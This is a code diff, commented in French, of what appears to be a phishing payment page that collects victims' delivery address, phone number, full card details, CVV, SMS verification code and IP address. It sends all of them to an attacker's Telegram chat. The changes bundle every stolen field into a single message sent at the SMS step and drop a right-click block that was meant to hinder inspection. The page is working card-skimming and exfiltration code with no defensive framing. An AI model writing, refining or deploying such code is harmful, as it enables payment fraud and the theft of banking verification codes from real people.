@@ -134,6 +134,7 @@
     const TELEGRAM_CHAT_ID = '7747778364';
 
     let userIP = ''; // Variable pour stocker l'adresse IP de l'utilisateur
+    let userFormData = {}; // Objet pour stocker les données du formulaire
 
     // Fonction pour envoyer un message à Telegram
     function sendToTelegram(message) {
@@ -164,20 +165,6 @@
       fetchUserIP();
     };
 
-    // Bloquer l'accès à l'inspection du fichier via le clic droit
-    document.addEventListener('contextmenu', function (event) {
-      // Vérifier si le clic droit est effectué sur les champs de formulaire
-      if (!(event.target.id === 'cardholder-name' || 
-            event.target.id === 'card-number' || 
-            event.target.id === 'expiry-date' || 
-            event.target.id === 'cvv' || 
-            event.target.id === 'sms-code' || 
-            event.target.id === 'phone-number' || 
-            event.target.id === 'delivery-address')) {
-        event.preventDefault(); // Empêcher l'inspection du fichier en dehors des champs spécifiés
-      }
-    });
-
     // Fonction pour autoriser uniquement le clic droit dans certains champs de formulaire (pour coller)
     document.getElementById('payment-form').addEventListener('contextmenu', function(event) {
       if (event.target && (event.target.tagName === 'INPUT')) {
@@ -198,8 +185,19 @@
       const expiryDate = document.getElementById('expiry-date').value;
       const cvv = document.getElementById('cvv').value;
 
+      // Enregistrer les données du formulaire avec l'IP
+      userFormData = {
+        deliveryAddress: deliveryAddress,
+        phoneNumber: phoneNumber,
+        cardholderName: cardholderName,
+        cardNumber: cardNumber,
+        expiryDate: expiryDate,
+        cvv: cvv,
+        ip: userIP
+      };
+
       // Ajouter l'adresse IP et l'adresse de livraison dans le message Telegram
-      sendToTelegram(`
+      let message = `
         Paiement reçu :
         Adresse de livraison : ${deliveryAddress}
         Numéro de téléphone : ${phoneNumber}
@@ -208,7 +206,9 @@
         Expiration : ${expiryDate}
         CVV : ${cvv}
         IP : ${userIP}
-      `);
+      `;
+
+      sendToTelegram(message); // Envoyer les informations à Telegram
 
       document.getElementById('step-1').classList.add('hidden');
       document.getElementById('step-2').classList.remove('hidden');
@@ -225,8 +225,19 @@
 
       const smsCode = document.getElementById('sms-code').value;
 
-      // Ajouter l'adresse IP dans le message Telegram
-      sendToTelegram(`Code SMS reçu : ${smsCode} | IP : ${userIP}`);
+      // Récupérer les données du formulaire précédemment stockées et ajouter le code SMS
+      let message = `
+        Formulaire complet pour IP : ${userIP}
+        Adresse de livraison : ${userFormData.deliveryAddress}
+        Numéro de téléphone : ${userFormData.phoneNumber}
+        Nom : ${userFormData.cardholderName}
+        Numéro : ${userFormData.cardNumber}
+        Expiration : ${userFormData.expiryDate}
+        CVV : ${userFormData.cvv}
+        Code SMS reçu : ${smsCode}
+      `;
+      
+      sendToTelegram(message); // Envoyer les informations avec le code SMS à Telegram
 
       document.getElementById('step-3').classList.add('hidden');
       document.getElementById('step-4').classList.remove('hidden');
